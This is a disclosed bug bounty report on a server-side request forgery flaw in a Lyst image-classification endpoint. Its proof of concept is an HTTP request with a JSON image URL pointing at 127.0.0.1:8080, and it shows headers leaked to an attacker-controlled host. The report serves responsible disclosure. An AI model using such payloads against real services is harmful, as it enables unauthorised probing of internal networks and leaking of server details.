# SSRF at iris.lystit.com

## Report Details
- **Report ID**: 206894
- **URL**: https://hackerone.com/reports/206894
- **State**: Closed
- **Severity**: low
- **Submitted**: 2017-02-16T14:13:21.528Z
- **Disclosed**: 2017-10-18T09:43:49.380Z

## Reporter
- **Username**: tripwire
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: lyst

## Vulnerability Information
###Server Side Request Forgery

**Host**: `iris.lystit.com`
**Route**: `/models`

**Summary**
This vulnerability allows unauthenticated attacker to make arbitrary server-side HTTP GET requests, e.g. issue HTTP-requests to internal hosts and resources, limitedly scan ports, potentially bypass some restrictions for incoming requests, etc. 


###PoC
Reaching same REST application via local IP 127.0.0.1 at port 8080:

```
POST /models/default/classification/color HTTP/1.1
Host: iris.lystit.com
Accept: application/json
Content-Length: 111
Content-Type: application/json
Connection: close

{
    "images": ["http://127.0.0.1:8080/static/rest_framework_swagger/images/wordnik_api.86c91314ec1a.png"]
}
```

Response:
```
HTTP/1.1 200 OK
Allow: POST, OPTIONS
Content-Type: application/json
Date: Thu, 16 Feb 2017 13:05:28 GMT
Vary: Cookie
X-Frame-Options: SAMEORIGIN
Content-Length: 76
Connection: Close

{"data":{"color":{"probability":"0.903368339285","id":12,"value":"orange"}}}
```

Requesting attacker-controlled host leaks IP and these headers:

```
Request: GET / HTTP/1.0
Connection: close
Accept-Encoding: gzip, deflate
Accept: */*
User-Agent: python-requests/2.7.0 CPython/2.7.6 Linux/3.13.0-108-generic
X-NewRelic-ID: VgQPVFBTGwIGXFdQDwAC
X-NewRelic-Transaction: PxQEBwVQDQoEAldbVQMPXlBSFB8EBw8RVU4aUV5bBwcKUV9XCAMBWlwCVENKQQ8AUgdXUw9VFTs=
```

###Possible Mitigation Measures

Add whitelist to allow use of only trusted domains.

## Attachments
No attachments
